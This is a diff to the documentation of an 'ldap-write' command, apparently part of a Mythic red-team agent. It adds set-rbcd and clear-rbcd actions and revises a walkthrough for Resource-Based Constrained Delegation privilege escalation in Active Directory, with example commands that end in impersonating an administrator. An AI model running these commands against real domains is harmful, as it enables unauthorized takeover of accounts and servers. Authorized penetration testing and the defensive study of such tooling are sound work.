@@ -40,6 +40,8 @@ Modify Active Directory objects via LDAP. Add or remove group members, set or de
 | set-password | Set account password (requires LDAPS) | target, value, use_tls |
 | add-computer | Create a machine account (for RBCD attacks) | target, value |
 | delete-object | Delete an AD object (cleanup after RBCD) | target |
+| set-rbcd | Configure RBCD delegation (auto-builds security descriptor) | target, value |
+| clear-rbcd | Remove RBCD delegation from an object | target |
 
 ## Usage
 
@@ -76,6 +78,16 @@ ldap-write -action set-attr -server dc01 -target jsmith -attr description -value
 **Create machine account (for RBCD):**
 ```
 ldap-write -action add-computer -server dc01 -target FAKEPC01 -value "Password123!" -username user@domain.local -password pass
+```
+
+**Set RBCD delegation (auto-builds security descriptor):**
+```
+ldap-write -action set-rbcd -server dc01 -target victimserver -value FAKEPC01$ -username user@domain.local -password pass
+```
+
+**Clear RBCD delegation (cleanup):**
+```
+ldap-write -action clear-rbcd -server dc01 -target victimserver -username user@domain.local -password pass
 ```
 
 **Delete an object (cleanup):**
@@ -127,7 +139,7 @@ Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation 
 
 2. **Set RBCD delegation** on the target (requires GenericWrite/GenericAll on target):
    ```
-   ldap-write -action set-attr -server dc01 -target targetserver -attr msDS-AllowedToActOnBehalfOfOtherIdentity -value <security descriptor> -username user@domain.local -password pass
+   ldap-write -action set-rbcd -server dc01 -target targetserver -value FAKEPC01$ -username user@domain.local -password pass
    ```
 
 3. **Perform S4U** to get a service ticket as admin:
@@ -135,8 +147,9 @@ Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation 
    ticket -action s4u -target targetserver -impersonate administrator
    ```
 
-4. **Cleanup** — delete the machine account:
+4. **Cleanup** — clear RBCD and delete the machine account:
    ```
+   ldap-write -action clear-rbcd -server dc01 -target targetserver -username user@domain.local -password pass
    ldap-write -action delete-object -server dc01 -target FAKEPC01$ -username user@domain.local -password pass
    ```
 
@@ -149,6 +162,7 @@ Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation 
 - Password is encoded as UTF-16LE with surrounding quotes per AD's `unicodePwd` attribute format
 - `add-computer` creates objects in the default CN=Computers container
 - `add-computer` requires ms-DS-MachineAccountQuota > 0 (default: 10 for domain users)
+- `set-rbcd` automatically resolves the delegated account's objectSid and builds the security descriptor — no external tools needed
 - `delete-object` requires Delete permission on the target object
 - All modifications generate Mythic artifacts for tracking
 - Write operations require appropriate AD permissions (Domain Admin, delegated rights, or object owner)
@@ -157,4 +171,5 @@ Resource-Based Constrained Delegation (RBCD) is a powerful privilege escalation 
 
 - **T1098** — Account Manipulation
 - **T1098.005** — Account Manipulation: Device Registration
+- **T1134.001** — Access Token Manipulation: Token Impersonation/Theft
 - **T1136.002** — Create Account: Domain Account
